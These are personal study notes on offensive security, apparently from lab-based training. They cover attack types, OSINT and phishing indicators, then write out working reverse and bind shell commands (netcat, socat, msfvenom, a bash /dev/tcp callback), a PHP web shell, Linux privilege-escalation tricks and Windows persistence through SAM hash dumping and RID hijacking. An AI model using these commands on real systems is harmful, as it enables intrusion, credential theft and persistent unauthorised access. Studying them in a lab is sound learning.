*Go through these and expand/explore*
- Malware.
- Denial-of-Service (DoS) Attacks.  // as well as with DDoS attacks
- Phishing.
- Spoofing.
- Identity-Based Attacks.
- Code Injection Attacks.
- Supply Chain Attacks.
- Social Engineering Attacks.
(the above was taken from crowdstrike.com as the 12 most common types of attacks today June 2024)

- HTTP: Could potentially host web applications where vulnerabilities like SQL-Injections or RCE (Remote Code Execution) lay
- FTP: Could allow anon logins
- SMB: Could be vuln to exploits
- SSH: Default creds? 
- RDP: Weak creds? 

- Smurf Attack
	- Occurs when the attacker floods the target network with infinite ICMP request packets. Packets include a spoofed source address sent to the network's broadcast address, which prompts every device on the network that receives the request to the spoofed source
- Watering Hole Attack
	- Targeting a specific group of people when it is identified that they frequent a specific website
	- Compromising the website and then redirecting them to a malicious website of the attackers choice
- APT - Advanced Persistence Threat
- Request Smuggling
- RETBleed Attack
	- *Expand on this*
- PHISHING
	- An attempt to steal sensitive information, typically in the form of usernames, passwords, credit card numbers, bank account information or other important data in order to utilise or sell the stolen information
- MITM - Man-In-The-Middle
- RCE - Remote Code Execution
	- Allows commands to be executed on the targets system. 
- Passive Reconnaissance
	- Gathering information about a company
	- To gain a better understanding of how a network structure (or system in general) is designed/set up. 
- Local File Inclusion Vulnerability/Exploit
	- Can be used in conjunction with XSS (Cross-Site Scripting) attacks
	- In php.ini config file, "allow_url_include" wrapper is set to "Off" by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if "allow_url_include" and "allow_url_fopen" are set to "OFF", PHP will not prevent the loading of SMB URLs. (from THM)
- Remote File Include (RFI)
	- An attack technique used to exploit "dynamic file include" mechanisms in web applications. When web applications take user input (URL, parameter value etc) and pass them into file include commands, the web application might be tricked into including remote files with malicious code. (zaproxy.org)
- Mimikatz
- Spoofing
	- 
- 
- SQL Injection Attack
	- A common attack vector that uses malicious SQL code for backend database manipulation to access information that was not intended to be displayed. 
- HTTP Request Smuggling (HRS)

- Fork Bomb
	- Also known as a Rabbit Virus)
	- Self-replicating child processes consume system resources, blocking legitimate programs from running and preventing the creation of new processes. During an attack, keyboard inputs (log out attempts for example) are ignored, essentially locking the system
- Zip Bomb
	- Also known as Decompression Bomb or Zip of Death (ZOD)
	- A malicious archive file designed to crash or render useless the program or system reading it. Often employed to disable antivirus software, in order to create an opening for more traditional malware.
	- Instead of hijacking the program's operation, creates an archive that requires an excessive amount of time, disk space or memory to unpack. 
	- Most modern AV utilities can detect a ZIP Bomb before unpacking it. 
	- The “42. zip” is one of the largest and best-known zip bombs. When unopened, it appears to hold only 42 kilobytes of data. However, after decompressing, the file can expand to 4.5 petabytes (the equivalent of 4,500 terabytes). (taken from us.norton.com)
- XML Bomb
	- A form of DOS/DDOS attack where a small piece of code is sent to overwhelm the program that parses XML files and crash the server. 
	- When an XML parser tries to process the message, nested data entities inside of it start growing exponentially and crash the server. 
	- A BILLION Laughs (lol)
- Growth Hacking
	- **RESEARCH THIS**
- XSS - Cross-Site Scripting
	- Stored XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. 
	- Three Main Types:
		- DOM (Special)
			- Document Object Model XSS
			- Uses HTML env to execute malicious javascript
			- Uses the < script > < / script > HTML tags
			- XFS
				- Cross Frame Scripting
					- When executing Javascript code to bring up a frame will normally depict that the Websystem is vulnerable to XSS
		- Persistent (Server-side)
			- Javascript that is run when the Server loads the page that is running it
			- Happens when the Server does not sanitise the User data when its uploaded to a page 
			- Commonly found on blog posts
		- Reflected (Client-side)
			- Run on the Clients end
			- Normally happens when the Server doesn't sanitise search data
- CSRF (or XSRF) - Cross-Site Request Forgery
	- Also known as one-click attack or session riding
	- Type of malicious exploit of a website or web application where unauthorised commands are submitted from a user that the web application trusts.
		(from Wikipedia)
- Supply Chain Attack
	- A cyberattack that targets a trusted third-party vendor who offers services or software vital to the supply chain. 
	- Software Supply Chain Attacks inject malicious code into an application in order to infect all users of an app, while hardware supply chain attacks compromise physical components for the same purpose. 
	- Software supply chains are particularly vulnerable because modern software is not written from scratch: rather, it involves many off-the-shelf components, such as third-party APIs, open source code and proprietary code from software vendors. 
	- Today the average software project has **203 dependencies**. 
	  (above from crowdstrike.com)
  - RAT (remote Access Trojan)
  - Buffer Overflow

- Methodologies
	- OSINT
		 - OSINT - Open-Source Intelligence
			- Being really good for searching stuff online
			- Have a look at ADSB below
			- Tracking people, tactics etc
		- ADSB - Automatic Dependent Surveillance-Broadcast
			- in regards to FlightRadar24.com 
			- Each plane has a transponder
			- https://globe.adsbexchange.com/
			- https://www.flightradar24.com/
			- https://www.vesselfinder.com/
			- Satellite Trackers:
				- https://in-the-sky.org/satmap_worldmap.php
				- https://satellitemap.space/
		- NZ is responsible for a lot of ocean
			- "Search: NZ Search and Rescue Region"
			- Have to look out for:
				- For sea-bed trawlers
				- Mayday calls
				- Pirates
				- Illegal fishing
				- Others, look em up if you want
		- Department of Defense 
				- Launched a satellite for Defcon (end of July beginning of August)
				- So people can practice hacking into it
				- Because there are a lot of systems on satellites orbiting around space which are from a long time ago, ie the 1970s, that aren't running with the same technology (hardware, software etc) as what we have now
		- Cube Satellites
			- Private companies (similar to Starlink) go up in lower-orbit and knowing the security that goes with that can help with the defensive side of things (or vice versa)
			- Kris' brother works in relation to these kinds of tech
		- WIGLE:
			- https://wigle.net/
			- All the networks. Found by Everyone
			- Google cars when running around used to scan SSID's around any given area
				- Had a database wherein they didn't have it secured with ACLs
		- Strava (fitness app)
			- They had a world map
			- https://www.strava.com/maps/global-heatmap (this is their heat map)
			- Routines and Habit generation from individuals
			- Afghanistan war
				- Whoever had Strava on their smart devices (usually the Westerners!) were allowing others to view their activity
		- GPS (Global Positioning System)
			- Three satellites
				- Consumer Grade
					- Depending the signal strength on your phone can pick up your location with a 10m difference or triangulation area
				- Military Grade
					- Distance difference of millimetres
			- Geofencing
				- Creates a virtual geographical boundary that triggers a marketing action to a mobile device when a user enters or exits that boundary.
		- Spoofing
		- Shodan Search Engine (https://www.shodan.io/)
			- Crawling, IP lookups, searching, data streaming)
			- Shodan is the world's first search engine for Internet-connected devices. Discover how Internet intelligence can help you make better decisions.
- Spam (Spiced Ham in a Can :) ) 
	- First email classicified as spam dates back to 1978
- Phishing
	- Attack vectors:
		- Phone Call
		- Text Message
		- an Email
		- Spear phishing
			- targeting a specific individual(s) or organisation seeking sensitive information
		- Whaling
			- Targeted to specific C-Level high position individuals (the chief's of a company as such - ie CEO, CTO, FO etc)
		- Smishing
			- Phishing to mobile devices targeting mobile users specifically crafted text messages
		- Vishing
			- These attacks are based on voice calls
	- Common traits of phishing emails:
		- Email spoofing: sender email name/address will masquerade as a trusted entity
		- The subject line and/or body is written with a sense of urgency, or uses certain keywords such as Invoice, Suspended, and so on
		- The email body is designed to match a trusting entity (such as Amazon, Microsoft and so on)
		- Email body is poorly formatted or written
		- The email body uses generic content, such as Dear Sir/Madam
		- URL Shortening - Hyperlinks (oftentimes uses URL shortening services to hide its true origin)
			- Tools to check Shortened URLs and where they may go
				- ie https://checkshorturl.com/
		- A malicious attachment posing as a legitimate document
		- HTML to impersonate a legitimate brand
		- A sense of Urgency
			- You made a payment
			- click here to cancel
			- Click here to unsubscribe if you don't want to be in this mailing list again
	- Hyperlinks and IP addresses should be DEFANGED
	- Defanged/defanging (CyberChef has a tool for this)
		- a way of making the URL/domain or email address unclickable to avoid accidental clicks (which may result in a serious security breach)
		- ie
			- www.something.com would become www/./something/./com 
	- Pixel Tracking
		- HTML code sniped is loaded when a user visits a website or opens an email
		- Useful for tracking user behaviour and conversions
		- Advertisers can acquire data for online marketing, web analysis, or email marketing
- BEC - Business Email Compromise
	- When an attacker/enemy gains control of an internal employee's account and then uses the compromised mailbox to convince other internal employees to perform unauth'd or fraudulent actions
- Typosquatting
	- When fraudulent bodies register domains with deliberately misspelled names of well-known websites/companies
- IETF (Internet Engineering Task Force)
	- The standard that emails generally follow is defined by the IETF
		- Specifically RFC 5322
			- Which specifies the syntax and semantics of email messages
		- RFC 2045-2049
			- which defines the MIME (Multipurpose Internet Mail Extensions) standards for email messages on the Internet
- Juicy Potato
- Pass The Hash
	- An attacker captures a password hash (as opposed to the characters/plaintext version of it)
- DNS Tunneling
	- Communication with infected devices through encoded DNS queries and responses
	- ie the information stealing malware Nutshell/Ismdoor (first noticed in 2017)
	- An attacker who controls the authoritative server for a particular domain can see all DNS queries/requests for that domain name. The infected device can then transmit data to the attacker. 
	- Can also be used as a two-way comms channel between infected devices and command and control (C2) units which are operated by the attacker(s). 
		- The attacker C2 sends encoded messages back to the infected devices in the DNS responses
	- It's the volume of DNS records on any given day that can serve as an effective smoke screen as such to cover the attackers infrastructure. 
- ISMDoor / ISMAgent
- BadUSB's
- Cold-boot Attack
	- For pulling encryption keys ....
- Password Spraying
- 

- Using Scheduled Tasks to execute code at any given time
	- So as to break up irregular behaviour
	- (such as when a user freshly logs in, or perhaps shuts down etc)

- Enumeration
	- Finding out vulnerabilities on a target/device to find potential areas that can be focused upon
	- Some items to gather:
		- unames and pwords
		- network info
		- hostnames
		- app data
		- services
		- pretty much anything (the list is quite dynamic when you think about it.)
	- SMB
		- Tools:
			- Enum4Linux
				- enumerate shares (both on Linux and Win platforms)
			- smbclient

- SQL Injection (yes this is probably up top somewhere but I'll collate these later when (if) I do)
	- When malicious or mungbeaned queries are issued to either retrieve or muck around with data from the database (and sometimes, to get into Accounts)
- Command Injection
	- When a WebApp will take input, or user-controlled data and run then as if they were system commands. An outsider may use this to tamper with data, execute their own commands to the system and so on
- Email Injection..
	- The ability to send Emails without being auth'd by the Mail Server. Happens when extra data is added to fields, which the Mail Server doesn't interpret correctly

- Shelling Shells
	- Reverse Shell
		- Forcing a machine to either send us CLI access
	- Bind Shell
		- Opening up a Port on the focused machine of which when connected further commands can be executed
	- Tools
		- Netcat
			- Manually perform numerous networking interactions
			- Used to receive reverse shells and connect to remote ports which are attached to bind shells on a target
			- Netcat shells are unstable (meaning easy to lose/drop)
		- Socat
			- Like Netcat, but amp'd up on drugs
			- Usually more stable than Natcat
			- Syntax is more tricky
			- Socat is rarely installed by default
		- Metasploit (msfconsole)
			- Module: exploit/multi/handler
				- Provides a fully-fledged way to obtain stable shells
				- With a variety of options to utilise and improve the captured shell
				- Only way to interact with the meterpreter shell
		- Msfvenom
			- Ships by itself, although is actually a part of the Metaploit Framework
			- Used to generate payloads in real-time
		- SecLists Repo
			- Alongside the wordlists, there is code in there that are useful when shelling
	- Reverse Shells
		- The focused-machine is forced to run code that connects back to the adversary's machine
		- On the perp's end, a listener would be in place to receive the connection
		- Bypasses common firewall rules
		- The Perp Group's Network would need to be configured or set up in a way that would allow the ability to receive/accept that shell that is being returned
		- Listening is setup on the Perp-Group's machine
	- Bind Shells
		- The focused-machine has code executed that starts a listener attached to a shell that resides on it
		- This will then open that port up to the Internet/Network to allow access to it
		- Perp Group's Network doesn't have to have any incoming configurations/setups but the focused-machine may be sitting behind a Firewall
		- Listening is set up on the focused-machine itself
	- Shell States
		- Interactive
			- The shell will allow you to interact with programs after running them
			- ie the confirmation of setting up a connection via ssh to a machine (yes / no )
				- Requiring end-user input
		- Non-interactive
			- The majority of simple Reverse and Bind Shells are non-interactive
			- The output of interactive commands don't usually display in a Simple R/B Shell
			- However, that output does go somewhere, it is a matter of knowing where (logs)
	- Netcat (nc)
		- Params
			- -l
				- Listener/Listen
			- -v
				- Verbose please with outputs'z
			- -n
				- Do NOT resolve DNS host names or use DNS
			- -p
				- Which port to LISTEN on
			- BIND Shell (connecting out to:)
				- nc "host IP" "chosen/their_side_Listening_port"
	- Stability Techniques:
		- Linux
			- python,2,3
			- Don't CTRL+C ... xD
			- python -c 'import pty;pty.spawn("/bin/bash")'
				- Uses Python in the Reverse Shell / Bind Shell to spawn a more featured bash shell (you might need to specify python2 or python3 depending on the Linux box you are shelling to/from)
			- export TERM=xterm
				- additional access to commands such as 'clear'
			- Background the shell with CTRL+Z (backgrounds the Remote Shell) THEN stty raw -echo; fg (turns off our own terminal echo (which gives us access to commands like tab autocompletions, arrows, CTRL+C then bring the Remote Shell back into the Foreground)
				- reset
					- Re-enable terminal echo (from when the 'stty raw -echo' command was issued -- otherwise the Terminal will be pretty shiddy)
					- - Fixing the remote (reverse/bind) shell tty size
				- On the local host
					- stty -a
						- The Terminal Device Interface
						- Options for it
						- the -a will give you a fair amount of output, what you're after here will be the rows and columns
				- On the remote host
					- stty rows "the number you got from your own shell"
					- stty cols "the number you got from your own shell"
		- rlwrap
			- Gives access to history, tab autocompletes, arrow keys immediately upon receiving/binding a shell
			- CTRL+C requires some manual steps
			- rlwrap nc -lvnp "port"
				- Prepends the Netcat listener
			- Useful when dealing with Windows Shells
				- Which are bloody hard to stabilise
			- Same with the previous Python technique:
				- CTRL+Z; then
				- stty raw -echo; fg
		- Socat
			- using a Netcat shell as a stepping-stone into a more featured socat shell
			- Limited to LINUX Focused-Machines
				- Socat Shells on a Win Machine will be no more stable than a normal Netcat Shell
			- First, transfer a Socat Static Compiled Binary (https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (the program compiled to have no dependencies) 
				- Run an adhoc Webserver
					- PYTHON!
					- sudo python3 -m http.server 80
					  (note that this would need to be run from where the socat compiled binary is held)
					- On the Focused-Machine end
						- Linux
							- curl / wget " who's Ip? " / socat -o /tmp/socat
						- Windows PowerShell (note that the file will need to have the .exe file extension)
							- Invoke-WebRequest -uri " who's ip? " / socat.exe -outfile C: slash slash Windows slash temp slash socat.exe
			- Listener:
				- socat TCP-L:"port" -
					- equivalent to nc -lvnp 
					- Unstable, but will support Windows as well
					- Windows to connect back:
						- socat TCP:"localIP":"localPort" EXEC:powershell.exe,pipes
							- the pipes option sis used to force PowerShell to use Unix style standard input and output
					- Linux to connect back:
						- socat TCP:"localIP":"localPort" EXEC:"bash -li"
			- For Bind:
				- Linux:
					- socat TCP-L:"Port" EXEC:"bash -li"
				- Windows:
					- socat TCP-L:"Port" EXEC:powershell.exe,pipes
				- Pipes being used between Unix and Windows to handle input and output in a CLI env
				- On localhost:
					- socat TCP:"FocusedMachIP":"FocusedMachPort" -
			- New listener syntax (for both ends Linux) - special:
				- socat TCP-L:"localPort" FILE:'tty',raw,echo=0
					- Two parts as always
						- a listening Port
						- and a File
					- the echo=0 is foregrounding the command (stty raw -echo; fg)
				- This Listerner needs to be activated with a specific command
					- socat TCP:"localIP":"localPort" EXEC:"bash -li",pty,stderr,sigint,setsid,sane
						- first part we're linking with the localhost and port
						- The EXEC:"bash -li"
							- Creates an interactive bash session
							- pty
								- allocates a pseudoterminal on the FocusedMachine (part of stabilising)
							- stderr
								- any errors are thrown in the shell (an issue with non-interactive shells)
							- sigint
								- passes any CTRL+C entries through the sub-process, allowing us to kill commands inside the shell!
							- setsid
								- creates the process in a new session, woo
							- sane
								- stabilies the terminal, attempting to "norm" it
				- -d -d 
					- increases verbosity 
		- Encrypted Shells
			- Socat can create encrypted Shells - both Reverse and Bind
			- Can't be spied on
				- Unless you have the decryption key
			- Often able to bypass IDS units as a result
			- Wherever TCP was used to create basic Socat Shells above, replace it with OPENSSL
			- OpenSSL Cert Generation
				- On the Local Machine:
					- openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
						- That creates a 2048 bit RSA key with a matching cert file, with a lifespan of just about a year
						- When the command is run it will ask a series of information
						- You then get a:
							- shell.key and shell.crt file :) 
						- We must now merge these into a .pem file
					- cat shell.key shell.crt > shell.pem
			- Now, starting the LISTENURRRR
				- socat OPENSSL-LISTEN:"Port",cert=shell.pem,verify=0 -
				- (don't forget that - at the end of these commands, also for the ones above, those weren't typos)
				- verify=0 
					- Tells the connection to not bother trying to validate that our cert has been properly signed by a CA, a recognised authority
				- This cert HAS to be used on the device that is LISTENING
			- Connecting back:
				- socat OPENSSL:"LocalIP":"LocalPort",verify=0 EXEC:/bin/bash
			- BINDURR
				- FocusedMachine
					- socat OPENSSL-LISTEN:"Port",cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
				- Locale:
					- socat OPENSSL:"FocMachine":"FocMachinePort",verify=0
				- Observe that the cert must be used with the LISTENER, so it would need to be on whatever machine that you'd have listening
			- Examples:
				- socat OPENSSL-LISTEN:6969,cert=shell.pem,verify=0 FILE:'tty',raw,echo=0
						- BEAR IN MIND
							- the 'tty' is not surrounded by apostraphe's! ;) 
				- socat OPENSSL:127.0.0.1:6969,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
	- Common Shell Types:
		- For windows nc.exe /usr/share/windows-resources/binaries/nc.exe
		- netcat-traditional in Linux
			- For both of the above it's the
				- -e option
					- that allows to execute a process on connection
					- ie
						- nc -lvnp "port" -e /bin/bash
					- Will bind a shell as a result
			- Equally for a Reverse Shell
				- nc "ip" "port" -e /bin/shell
		- Important - most versions of Netcat are widely envisaged to be insecure. lel
		- Do this for a LISTENER:
			- mkfifo /tmp/f; nc -lvnp "Port" < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
				- This will create a named pipe at /tmp/f
				- Then it starts a Netcat LISTENER
				- connects the input of the listener to the output of the named pipe (above)
				- The output of the Netcat listener (the commands sent) gets piped directly into sh
				- sending the stderr output stream into stdout
					- 2>&1
				- Sending stdout itself into the input of the named pipe
		- SENDER:
			- mkfifo /tmp/f; nc "IP" "Port" < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
	- Msfvenom
		- Used to gen code for mainly Reverse and Bind Shells. 
		- Lower-level develoipments to generate hex shellcode when developing something like a Buffer Overflow exploit
			- It can generate payloads in different formats:
				- .exe
				- .aspx
				- .war
				- .py
		- msfvenom -p "payload" "optionsParams"
		- Example: Win x64 RevShell in exe:
			- msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST="listenIP" LPORT="listenPort"
		- Staged and Unstaged code:
			- Staged
				- Sent in two parts
					- Stager
						- Executed directly on the Server itself. It will connect back to a Listener, but doesn't contain any RevShell code itself
						- Uses the connection to the Listener to load the real payload
						- Prevents it from touching the disk where it could be caught
						- The code is essentially split into two prts, a small initial stager, then the actual heavier RevShell which is downloaded when the stager is initiated
						- Listeners used would usually be a Metasploit multi-handler
			- Stageless
				- More commonplace
				- Self-contained wherein there is only one piece of code, sends a Shell back straight away to the Listener
		- Meterpreter
			- Meterpreter Shells are Metasploit's own brand of a fully-featured Shell
			- Stable
			- Good for Lin-to-Win
			- MUST use Metasploit when wanting to consider meterpreter shells
		- Basic Convention
			- "OS"/"ARCH"/"PLFILE"
				- ie linux/x86/shell_reverse_tcp
				- A stageless shell for an x86 FocusedMachine
			- Stageless payloads are noted with the use of underscores
				- "shell_reverse_tcp"
			- Staged would be
				- "shell/reverse_tcp"
			- Meterpreter would have their own inclusion without the "shell" (meterpreter/reverse_tcp or meterpreter_reverse_tcp)
		- msfvenom --list payloads
	- Metasploits Multi/Handler
		- Tool for catching RevShells
		- Essential if you want to use Meterpreter shells and is the main tool used when using Staged Payloads
		- Open Metasploit first
			- msfconsole > use multi/handler
		- Three options to be set:
			- PAYLOAD
			- LHOST (listener)
			- LPORT
			- exploit -j command to launch the LISTENER
				- -j runs the job in the bg (background)
		- When the connection has been made and the Payload has been sent, the backgrounded job can be foregrounded by `sessions 1` 
			- Only IF that is the only session running, list other sessions by tabbing `sessions` if there are others running.
			- Session identifier is presented when the Payload has been dispatched
	- WebShells
		- /usr/share/webshells
		- A script that runs inside a Web Server
			- PHP, ASP
			- PHP is still the most common server-side scripting language that is used
		- `?php echo "<pre" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
			- This will take a GET param in the URL and run it on the system with shell_exec(). 
			- Any commands we enter in the URL after ?cmd= will be executed on the said system
				- `10.10.10.69/uploads/shell.php?cmd=ifconfig`
					- Will run ifconfig on said machine and display the results in a web-browser
	- Takeaways
		- Reverse and Bind Shells are okay for Threat Actors, however, they will more than likely try and get Privileged Escalation due to the instability that a lot of the remote shells involve.. But this is not to say that they won't be able to do damage even without, providing they were able to get a Remote Shell up in the first place.
- Enumeration 
	- Tools
		- The common Web-browser
			- Page source code
			- Finding assets
			- Debugging and executing code such as javascript on the Client-side
			- Inspect tool
		- nmap
		- gobuster
		- wpscan
		- nikto
		- BurpSuite
- CSRF
	- Cross Site Request Forgery

- Privileged Escalation
	- Reset passwords
	- Bypass access control to compromise protected data
	- Edit software configurations
	- Enable persistence
		- So you can access the machine later
	- Change privilege of users
	- Get that cheeky root flag! ;) 
- Horizontal Privilege Escalation
	- You expand your reach over the compromised system by taking over a different user who is on the same privilege level as you
	- A normal user compromising another normal user
		- Rather than going into admin/root or super
	- Inheriting their files and access
		- That has a SUID attached to their home directory
- Vertical Privilege Escalation
	- Gain higher priv access
	- (Travel up the tree) 
- LinEnum
	- Bash script that performs common commands related to privilege escalation
	- [https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
	- Some commands:
	- Just take note that LinEnum will need to be an executable somewhere on the target machine
	- Broken down into sections:
		- Kernel
			- Kernel information shown
			- Maybe there's a Kernel exploit
		- Can we read/write sensitive files:
			- The world-writable files are shown
			- Files that any auth'd user can read and write to
			- Can point out possible misconfigurations that allow users to write to files where normally they shouldn't
		- SUID Files:
			- Set Owner User ID
			- Allows for the file to run with whatever kind of permissions that the owner has of the file, if this is a root file - then it will allow us to run the file as root
		- Crontab Contents:
			- Scheduled Cron Jobs shown
			- "Scheduled Tasks"
- Searching for SUID/GUID files
	- `find / -perm -u=s -type f 2>/dev/null`
	- `find / -perm -u=g -type f 2>/dev/null`
	- any SUIDs as root? 

- A 'writable' /etc/passwd file..
	- Create a hashed password as /etc/passwd will need a hashed password to be entered
	- `openssl passwd -1 -salt 'saltValue' 'password'`
	- `mkpasswd -m sha-512 'password'`
	- go ahead and edit the /etc/passwd file
	- `username:passwordHash:0:0:/root:/bin/bash`

- `sudo -l`
	- Lists what commands you're able to use as a super user on that account
	- You might find that you can run certain commands as a root user without the root password
- Escaping vi
	- If the user has access to run vi as root
	- then launch vi with sudo
	- `:!sh`
	- will open a shell :) 
	- `export PATH=/'directoryWhereImitationIs':$PATH`

- Misconfigured Binaries 
	- https://btfobins.github.io
	- Binaries, if misconfigured can be exploited

- Check what cron jobs are scheduled and run
	- `cat /etc/crontab`
	- If one of these runs as root but is for a user you have access to
		- Go through and put a payload in there that runs when the job is run say for example
		- Consider `msfvenom`

- Exploiting PATH
	- `echo $PATH`
	- consider having a SUID Binary
	- If the binary file calls the system shell to do a basic process like `ls` to list processes
	- create an imitation of the `ls` command where the imitation actually opens a bash shell
		- `echo "/bin/bash" > ls`
		- export this to PATH
		- `export PATH=/'dir_of_imitation_file':$PATH`
	- Now say if there was a script that was sitting around that was owned by root and the user is root, but has executable permissions for all users (along with read)
		- Then you'd be able to run that script and get into shell as root....

- Exploiting UDFs (User-Defined Functions)
	- Check for which services are running as root
		- for example, MySQL
		- (please don't allow SQL services to run as root.....)
	- Find your way

- Weak file permissions
	- /etc/passwd
	- /etc/shadow

- `sudo -l` Environment Variables
	- `LD_PRELOAD` and `LD_LIBRARY_PATH`
		- Inherited from the user's environment
	- `LD_PRELOAD`
		- loads a shared object before any others when a program is run
	- `LD_LIBRARY_PATH`
		- Provides a list of directories where shared libraries are searched for first
	- Have a look and see what Environment Variables are being used
		- As this will be different depending on the host you are on
	- Something like this can be run (depending if you have a C file to compile - and what its contents describe
		- `gcc -fPIC -shared -nostartfiles -o /tmp/preload.o ~/preload.c`
		- `sudo 'ENV_VARIABLE'=/tmp/preload.o program_name`
			- `program_name` here would be something that you have sudo abilities over (recall `sudo -l`)
			- Welcome to root
	- Library Paths
		- check for Library Dependency Links
			- `ldd 'programName` (programName of a sudo runnable command listed under `sudo -l` )
		- I have kept the code in library_path.c somewhere else
			- `gcc -o /tmp/'libraryName' -shared -fPIC ~/library_path.c`
			- sudo LD_LIBRARY_PATH=/tmp `'programName'`
			- Welcome to root

- Cron Jobs - File Permissions
	- See if there's one that you can write to, if it's run by root then, add this sucker to it:
	- `#!/bin/bash` 
	  `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`
	  (changing details where relevant)

- Cron Jobs - PATH Environment Variable
	- Check to see if you have access to any directory given in PATH of `cat /etc/crontabs`
	- If you do, then woo! 
	- Create a file in there that has this:
		```bash
		#!/bin/bash
		cp /bin/bash /tmp/rootbash
		chmod +xs /tmp/rootbash
```
	- Make sure the file is executable
	- Wait for the cronjob to run
	- Then run the /tmp/rootbash command with a `-p` to gain a shell with root priv

- Finding SUID/GUID Executables
	- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- Finding SUID/GUID files:
	- `find / -perm -u=s -type f 2>/dev/null`
	- `find / -perm u=g -type f 2>/dev/null`
- Another handy command:
	- `find / -user root -perm -4000 -exec ls -ldb {} \;`
- SUID/SGID Executables - Shared Object Injections
- SUID/SGID Execs - Environment Variables
- SUID/SGID Execs - Abusing Shell Features
	- For example Bash versions earlier than 4.2-048 allowed one to define shell functions with names that resemble file paths
		- ie creating a function called `/usr/sbin/service`
			- `function /usr/sbin/service { /bin/bash -p; }`
		- Then exporting it
			- `export -f /usr/sbin/service`
		- Then running a service that would sit in that directory
		- You could find this by finding a SUID executable, doing a `strings` on it to see if it points out to any such directory
		- Bearing in mind if the shell would allow something like this ofcourse..

- Password & Keys
	- Users sometimes might type their password into the CLI instead of in the password prompt
		- This would then be in their history
	- Viewing history
		- `cat ~/.*history | less`

- NFS
	- Files created via NFS inherit the remote user's ID. 
	- If the user is root, and root squashing is enabled, the ID will instead be set to the 'nobody' user
	- Check NFS share configurations
		- `cat /etc/exports`
	- *(needing to add more here)*

- Creating a simple privileged root shell payload with msfvenom
	- `msvenom -p 'distro'/exec CMD="/bin/bash -p" -f elf -o /tmp/'ploadName'`

- Kernel Exploits
	- Can leave the system in an unstable state
	- Run them as a last resort

- Burpsuite
	- Fuzzing an upload form on a Web-browser

- Windows Local Persistence
	- Assuming one has privileged access - adding a User to the 'Backup Operators' group 
	- **Backup Operators** 
		- bypass DACL (Discretionary ACLs) allowing it's members with read/write access to registry keys
		- Meaning the content of SAM and SYSTEM registry hives can be copied
		- Which can then be used to recover password hashes for all users
		- Privileges
			- SeBackupPrivilege - the user can read any files in the system
			- seRestorePrivilege - the user can write any files in the system
	- NOTE:
		- **LocalAccountTokenFilterPolicy** (User Access Control) will strip any local admin account of its privileges when that account has been logged into remotely (by default).
		- While you can elevate privileges via UAC and a GUI, if you're using a tool like WinRM to remote on to the machine then you are restricted to a limited access token with no privileges
		- Disabling:
			- Registry key that has to be toggled:
			- `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
			- `whoami /groups`
		- Note - Windows localgroups that may need to be considered are:
			- `Remote Desktop Users`
			- `Remote Management Users`
			- `Backup Operators`
	- SAM and SYSTEM files exfiltration
		- Four commands, via the use of `evil-winrm`
			- `reg save hklm\system system.back`
			- `reg save hklm\sam sam.bak`
			- `download system.bak`
			- `download sam.bak`
		- Using tools like `secretsdump.py` one can do a hash dump
			- `python /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL`
		- Now do a PTH (pass the hash) login with evil-winrm
	- Different levels of **Privilege**
		- https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
		- `secedit`
			- Command to assign privileges to users
			- export the current config to a temp file:
				- `secedit /export /cfg config.inf`
				- Make changes to the temp file as needed
				- (ie to the Privilege Rights section, adding a user to the SeBackup/RestorePrivilege lines
			- now we conver that inf file into an sdb file
				- `secedit /import /cfg config.inf /db config.sdb`
			- Then configure it into the system
				- `secedit /configure /db config.sdb /cfg config.inf`
			- Another way to allow remote connections for Backup Operators users
				- Instead of adding the user to the Remote Management Users group, we'll change the security descriptor associated with the WinRM service to allow users to connect
					- Security descriptors can be like ACLs but applied to other system facilities
				- Via GUI instance of PowerShell:
					- `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI`
			- Note that users won't appear in any local groups via this method
	- RID (Relative) ID Hijacking
		- Changing some reg values to make the OS think that you are an admin
		- An RID is assigned to users when they are first created. 
		- This is a numerical identifier representing the user across the system
		- The LSASS (Local System Authority Subsystem Service)
		- The LSASS process gets the users RID from the SAM registry hive, and then creates an access token associated with that RID
		- If the registry value can be tampered with, then we can make Windows assign an Administrator access token to an unprivileged user by associated the same RID to both accounts
		- Windows systems
			- Default Admin account is assigned RID = 500
			- Regular users will be >= 1000
				- Somewhat similar to Linux environments
			- Command to view SIDs, RIDs
				- `wmic useraccount get name,sid`
			- The RID is the last bit of the sid
			- psexec (PsExec64.exe) in pstwools will be needed to access the SAM via regedit (as the SAM is restricted to the SYSTEM account only - meaning admin can't modify it either)
			- In the drive where psexec is:
				- `PsExec64.exe -i -s regedit`
				- NOTE: This will need a GUI
			- `Computer\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users`
			- Note that the registries listed here will be in hex - get the RID and convert it to hex to move forward
			- There will be a key called `F` - the RID will be at position 0x30 (You'll notice that the RID is right to left, inverted essentially)
			- We then want to replace these bytes with the Admin RID (500, in hex is **01F4**) - replace the entry in 0x30 with **F4 01**
			- 